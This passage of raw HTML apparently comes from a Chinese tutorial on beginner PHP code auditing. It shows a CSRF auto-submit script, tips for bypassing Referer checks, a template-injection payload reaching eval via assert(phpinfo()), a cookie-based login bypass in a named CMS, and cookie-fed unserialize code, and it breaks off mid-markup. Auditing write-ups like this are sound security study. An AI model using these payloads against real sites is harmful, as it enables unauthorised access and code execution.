transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;script&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> document</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">forms</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">].</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">submit</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">();</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;/script&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">就是js自动提交表单 一般绕过 1.Referer有时候只是判断是否为空，这个我们就直接随便写个就行 2.判断必须为yicunyiye.cn这个域名，这个我们可以拿我们自己的域名解析为yicunyiye.cn.hack.cn就可以 3.判断为yicunyiye.cn/address.html，无解 然后就是不回显这种的话就前提是可以post转换为get然后再通过&lt;img src=&gt;去加载执行，然后就是xss配合csrf，如果存在点为发文章处，只要加载了就执行了poc</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: navy;">&lt;iframe</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(121, 93, 163);">src</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'http://aaa/1.html'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: navy;">/&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x07 代码执行 全局搜索eval</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.1493624772313297" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/35_5j6kdcb4YPVE7hJomfeUMIE0bTazqQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaICd2Vg5nw3iaudc9VUaKZgtgnK5j6kdcb4YPVE7hJomfeUMIE0bTazqQ/640?wx_fmt=png'" data-type="png" data-w="1098" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5807899461400359" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/36_Xte3ygAkibNMfnmvzJTFYBpvzLWFPA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIJqqspn0EOqfK8d14ScQ1e2iaE3Xte3ygAkibNMfnmvzJTFYBpvzLWFPA/640?wx_fmt=png'" data-type="png" data-w="1114" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到里面是存在一个变量可能存在代码执行</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$pattern </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@eval</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'if('</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $ifstr </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'){$flag="if";}else{$flag="else";}'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这两行可以知道要闭合前面的)而且要为真 payload就可以构造了 {if:assert(phpinfo())}{end if} 看一下谁调用了parserIfLabel不行再来搜下它的类ParserTemplate</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6193415637860082" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/37_QcPl9wwqIPoqKPULhQwo6mKVvJFHwA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaICmoS7v3NQm8VzqW97DibcibQEeQcPl9wwqIPoqKPULhQwo6mKVvJFHwA/640?wx_fmt=png'" data-type="png" data-w="972" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到save.php调用了 这里我们找个userinfo去写进去</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5031802120141343" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/38_uqiaZ1y5IxO9wOKKxTC3ibRicWRcDw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIxOqYeJkJumMKOck8pibTXvpUXC2icuqiaZ1y5IxO9wOKKxTC3ibRicWRcDw/640?wx_fmt=png'" data-type="png" data-w="1415" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后点击会员中心</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.29354838709677417" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/39_WkLEldJib6FXQtUFRTIan0O7cM5tlA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIkl91nTPm8VuCJm6cwmPutVLW9WkLEldJib6FXQtUFRTIan0O7cM5tlA/640?wx_fmt=png'" data-type="png" data-w="310" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8804537521815009" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/40_YWEtfYNicarovpk7caGwaibcaKU1aA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIGjAjc0Gjia1ht23XVlOzqy39nJFYWEtfYNicarovpk7caGwaibcaKU1aA/640?wx_fmt=png'" data-type="png" data-w="1146" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x08 逻辑漏洞 这里看到熊海cms</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3817427385892116" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/41_ofjtAQhN0PhaPjF58MjJSPIdNkJl8Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIbCUtlXoTR9Rd0hCibTskJ4FdTofjtAQhN0PhaPjF58MjJSPIdNkJl8Q/640?wx_fmt=png'" data-type="png" data-w="482" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">只要cookie存在user就可以绕过</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.24435318275154005" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/42_icFgkL3e67Pb3fDltzxBaZ1JalopKg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIKELglzgzxPWVbqepic8k6ALJmdicFgkL3e67Pb3fDltzxBaZ1JalopKg/640?wx_fmt=png'" data-type="png" data-w="974" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5627705627705628" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/43_cd0DibLoLVbBK3pTQ5MuHhlel7a1ZQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaItsQCrbhS6MUSYlvHLsicpTn97iccd0DibLoLVbBK3pTQ5MuHhlel7a1ZQ/640?wx_fmt=png'" data-type="png" data-w="1155" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">直接绕过登录</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">#0x09 反序列化 index.php</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="undefined" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">php</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    include</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"user.class.php"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">if</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(!</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">isset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$_COOKIE</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'user'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]))</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        setcookie</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"user"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> base64_encode</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">serialize</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">User</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'sk4'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">))));</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">else</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        unserialize</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">base64_decode</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$_COOKIE</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'user'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]));</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    echo </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"This is a beta test for new cookie handler\n"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">user.class.php</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="undefined" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">php</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  include</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"log.class.php"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, 